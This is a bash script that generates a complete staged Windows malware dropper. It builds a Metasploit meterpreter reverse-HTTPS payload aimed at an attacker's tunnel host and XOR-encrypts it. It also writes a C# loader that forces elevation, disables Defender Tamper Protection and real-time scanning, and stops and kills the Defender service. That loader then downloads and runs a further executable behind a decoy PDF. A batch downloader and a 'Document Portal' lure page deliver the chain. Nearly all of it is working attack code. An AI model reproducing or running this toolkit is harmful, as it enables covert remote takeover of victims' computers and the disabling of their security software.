#!/bin/bash
# pgen.sh - ULTIMATE STEALTH Payload Generator – Synchronous Defender Disabler + Auto‑elevation
# Usage: ./pgen.sh -t tunnel.trycloudflare.com -u https://your-site.vercel.app [-v]
# Requirements:
#   - Precompiled stage3.exe (your syscall loader) – place it as ../stage3.exe

set -e

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

# Defaults
TUNNEL_HOST=""; WEB_URL=""; BASE_PATH="/generated"
PAYLOAD_PORT="443"; XOR_KEY="0x6A"; OUTPUT_DIR="./generated"; VISIBLE_MODE=0

# Path to precompiled syscall loader
STAGE3B_SOURCE="../stage3.exe"                # your syscall loader

show_usage() {
    echo -e "${YELLOW}Usage: $0 -t <tunnel> -u <url> [-v]${NC}"; exit 1
}

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--tunnel) TUNNEL_HOST="$2"; shift 2 ;;
        -u|--url) WEB_URL="$2"; shift 2 ;;
        -p|--port) PAYLOAD_PORT="$2"; shift 2 ;;
        -k|--key) XOR_KEY="$2"; shift 2 ;;
        -o|--output) OUTPUT_DIR="$2"; shift 2 ;;
        -v|--visible) VISIBLE_MODE=1; shift ;;
        -h|--help) show_usage ;;
        *) echo -e "${RED}Unknown option${NC}"; show_usage ;;
    esac
done

[ -z "$TUNNEL_HOST" ] || [ -z "$WEB_URL" ] && show_usage

WEB_URL="${WEB_URL%/}"
FULL_BASE_URL="${WEB_URL}${BASE_PATH}"
XOR_KEY_DEC=$((XOR_KEY))

echo -e "${GREEN}[✓] Tunnel: $TUNNEL_HOST${NC}"
echo -e "${GREEN}[✓] Full URL: $FULL_BASE_URL${NC}"
echo -e "${GREEN}[✓] XOR Key: $XOR_KEY_DEC${NC}"
echo -e "${GREEN}[✓] Mode: $([ $VISIBLE_MODE -eq 1 ] && echo VISIBLE || echo STEALTH)${NC}"

mkdir -p "$OUTPUT_DIR"/{payloads,tools,output}
cd "$OUTPUT_DIR"

B64_URL=$(echo -n "$FULL_BASE_URL" | base64 -w 0)
B64_KEY=$(echo -n "$XOR_KEY_DEC" | base64 -w 0)

# ========== TOOLS ==========
echo -e "${YELLOW}[1/5] Creating payload generator...${NC}"
cat > tools/generate_payload.sh <<EOF
#!/bin/bash
TUNNEL="$TUNNEL_HOST"
PORT="$PAYLOAD_PORT"
LHOST_IP=\$(dig +short \$TUNNEL | head -n1)
[ -z "\$LHOST_IP" ] && LHOST_IP="104.16.231.132"
msfvenom -p windows/x64/meterpreter_reverse_https LHOST="\$LHOST_IP" LPORT="\$PORT" -f raw -o ../output/payload.raw
[ -f ../output/payload.raw ] && echo "✓ Done" || exit 1
EOF
chmod +x tools/generate_payload.sh

echo -e "${YELLOW}[2/5] Creating XOR encryption...${NC}"
cat > tools/xor_encrypt.py <<EOF
#!/usr/bin/env python3
import sys, base64
def xor_encrypt(inf, outf, key):
    with open(inf,'rb') as f: data = f.read()
    enc = bytes([b ^ key for b in data])
    with open(outf,'wb') as f: f.write(enc)
    with open(outf+'.b64','w') as f: f.write(base64.b64encode(enc).decode())
    print(f"✓ Encrypted {len(data)} bytes -> {outf}")
if __name__=="__main__":
    if len(sys.argv)<4: print("Usage: xor_encrypt.py <in> <out> <key>"); sys.exit(1)
    xor_encrypt(sys.argv[1], sys.argv[2], int(sys.argv[3]))
EOF
chmod +x tools/xor_encrypt.py

# ========== C# STAGE2 LOADER (EXE) – Synchronous Defender Disabler with Auto‑elevation ==========
echo -e "${YELLOW}[3/5] Creating C# Stage2 loader (synchronous, auto‑elevation)...${NC}"
cat > tools/stage2.cs <<EOF
using System;
using System.Net;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Security.Principal;

namespace Stage2
{
    class Program
    {
        static void Log(string message)
        {
            try {
                File.AppendAllText(Path.GetTempPath() + "stage2_log.txt",
                    DateTime.Now.ToString("HH:mm:ss") + " - " + message + Environment.NewLine);
            } catch { }
        }

        static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        static int RunProcess(string fileName, string arguments, out string output)
        {
            output = "";
            try {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = fileName;
                psi.Arguments = arguments;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                using (Process p = Process.Start(psi))
                {
                    output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                    p.WaitForExit(30000); // wait up to 30 seconds
                    return p.ExitCode;
                }
            } catch (Exception ex) {
                output = ex.Message;
                return -1;
            }
        }

        static void Main()
        {
            Log("=== Stage2 started ===");

            // Elevate if not admin
            if (!IsAdministrator())
            {
                Log("Not running as administrator. Attempting to elevate...");
                try {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = Process.GetCurrentProcess().MainModule.FileName;
                    psi.UseShellExecute = true;
                    psi.Verb = "runas"; // request elevation
                    Process.Start(psi);
                } catch {
                    Log("Elevation failed. Exiting.");
                }
                return;
            }
            Log("Running with administrator privileges.");

            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                Log("TLS configured");

                // ========== DISABLE WINDOWS DEFENDER ==========
                Log("Starting Defender disable procedure...");

                // 1. Disable Tamper Protection via registry (using reg.exe)
                int regResult = RunProcess("reg", @"add HKLM\SOFTWARE\Microsoft\Windows Defender\Features /v TamperProtection /t REG_DWORD /d 0 /f", out string regOut);
                Log("Tamper protection reg result: " + regResult + " - " + regOut);

                // 2. Disable real-time monitoring via PowerShell
                int mpResult = RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"", out string mpOut);
                Log("Set-MpPreference result: " + mpResult + " - " + mpOut);
                Thread.Sleep(5000);

                // 3. Stop and disable Windows Defender service using SC (synchronous)
                int scStop = RunProcess("sc.exe", "stop WinDefend", out string scStopOut);
                Log("SC stop result: " + scStop + " - " + scStopOut);
                Thread.Sleep(5000);
                int scConfig = RunProcess("sc.exe", "config WinDefend start= disabled", out string scConfigOut);
                Log("SC config result: " + scConfig + " - " + scConfigOut);

                // 4. Force kill MsMpEng.exe if it's still running
                try {
                    foreach (var proc in Process.GetProcessesByName("MsMpEng"))
                    {
                        proc.Kill();
                        Log("MsMpEng.exe killed.");
                    }
                } catch (Exception ex) {
                    Log("Error killing MsMpEng: " + ex.Message);
                }

                // 5. Verify Defender is off (loop with retries)
                bool defenderRunning = true;
                int retries = 0;
                while (defenderRunning && retries < 10)
                {
                    int checkResult = RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"if ((Get-Service WinDefend -ErrorAction SilentlyContinue).Status -eq 'Running') { exit 1 } else { exit 0 }\"", out string checkOut);
                    if (checkResult == 0)
                    {
                        defenderRunning = false;
                        Log("WinDefend is stopped.");
                    }
                    else
                    {
                        Log("WinDefend still running, waiting 10 more seconds... (attempt " + (retries+1) + ")");
                        Thread.Sleep(10000);
                        retries++;
                    }
                }

                if (defenderRunning)
                    Log("Warning: Defender may still be active, but proceeding...");

                // ========== DOWNLOAD AND RUN FINAL PAYLOAD ==========
                WebClient client = new WebClient();
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                string url = "$FULL_BASE_URL/payloads/stage3b.exe";
                string path = Path.GetTempPath() + "stage3b.exe";
                Log("Downloading stage3b from: " + url);
                client.DownloadFile(url, path);
                Log("Downloaded stage3b.exe, executing...");
                Process.Start(path);
                Log("stage3b.exe launched");

                // Decoy PDF
                client.DownloadFile("$FULL_BASE_URL/decoy.pdf", "decoy.pdf");
                Process.Start("decoy.pdf");
                Log("Decoy PDF opened");
            }
            catch (Exception ex)
            {
                Log("ERROR: " + ex.Message);
                if (ex.InnerException != null)
                    Log("INNER ERROR: " + ex.InnerException.Message);
            }
            Log("=== Stage2 finished ===");
        }
    }
}
EOF

# Compile the C# code – no extra references needed
if command -v mcs >/dev/null 2>&1; then
    mcs -target:exe -out:payloads/stage2.exe tools/stage2.cs
    echo -e "${GREEN}✓ stage2.exe compiled successfully${NC}"
else
    echo -e "${RED}✗ Mono C# compiler (mcs) not found. Please install it with: sudo apt install mono-mcs${NC}"
    exit 1
fi

# ========== STAGE 3B (Direct syscall payload) ==========
echo -e "${YELLOW}[4/5] Incorporating stage3b.exe (direct syscall loader)...${NC}"
if [ -f "$STAGE3B_SOURCE" ]; then
    cp "$STAGE3B_SOURCE" payloads/stage3b.exe
    echo -e "${GREEN}✓ stage3b.exe copied to payloads/${NC}"
else
    echo -e "${RED}✗ stage3b.exe not found at $STAGE3B_SOURCE${NC}"
    echo "Please compile your syscall loader and place it as ../stage3.exe."
    exit 1
fi

# ========== STAGE 1 (Batch downloader for stage2.exe) with Auto‑elevation ==========
echo -e "${YELLOW}[5/5] Creating Stage1.bat...${NC}"
cat > payloads/stage1.bat <<'EOF'
@echo off
title Stage1 Payload Loader (EXE)

:: Check for administrator privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    powershell start -verb runas '%0'
    exit /b
)

echo Running with administrator privileges.
echo [!] Downloading stage2.exe from FULL_BASE_URL_PLACEHOLDER/payloads/stage2.exe
echo %date% %time% - Starting download > %TEMP%\stage1_log.txt
powershell -Command "(New-Object Net.WebClient).DownloadFile('FULL_BASE_URL_PLACEHOLDER/payloads/stage2.exe', '%TEMP%\stage2.exe')"
if exist %TEMP%\stage2.exe (
    echo [✓] stage2.exe downloaded, executing...
    echo %date% %time% - stage2.exe downloaded successfully >> %TEMP%\stage1_log.txt
    start /B %TEMP%\stage2.exe
) else (
    echo [✗] Download failed
    echo %date% %time% - Download failed >> %TEMP%\stage1_log.txt
)
echo [2] Opening decoy.pdf...
echo %date% %time% - Downloading decoy.pdf >> %TEMP%\stage1_log.txt
powershell -Command "(New-Object Net.WebClient).DownloadFile('FULL_BASE_URL_PLACEHOLDER/decoy.pdf', 'decoy.pdf')" && start decoy.pdf
echo %date% %time% - Decoy opened >> %TEMP%\stage1_log.txt
EOF
sed -i "s|FULL_BASE_URL_PLACEHOLDER|$FULL_BASE_URL|g" payloads/stage1.bat

# ========== WEB FILES ==========
echo -e "${YELLOW}[✓] Creating web files...${NC}"
echo "This document requires a viewer update." > decoy.pdf
cat > index.html <<EOF
<!DOCTYPE html><html><head><title>Document Portal</title></head>
<body><h1>Document Portal</h1><p>Server: $FULL_BASE_URL</p><p>Tunnel: $TUNNEL_HOST</p>
<ul><li><a href="payloads/stage1.bat">Download stage1.bat</a></li></ul></body></html>
EOF

# ========== GENERATE ALL SCRIPT ==========
cat > generate_all.sh <<EOF
#!/bin/bash
echo "[🚀] Generating all payloads..."
cd tools && ./generate_payload.sh && cd ..
[ -f output/payload.raw ] && python3 tools/xor_encrypt.py output/payload.raw payload.enc $XOR_KEY_DEC
rm -f output/payload.raw
echo "Files ready for $FULL_BASE_URL: payload.enc decoy.pdf payloads/stage2.exe payloads/stage3b.exe payloads/stage1.bat index.html"
EOF
chmod +x generate_all.sh

echo -e "${GREEN}✅ DONE! Files created in $OUTPUT_DIR${NC}"
echo "Run: cd $OUTPUT_DIR && ./generate_all.sh"
echo "Then upload all files to $FULL_BASE_URL"
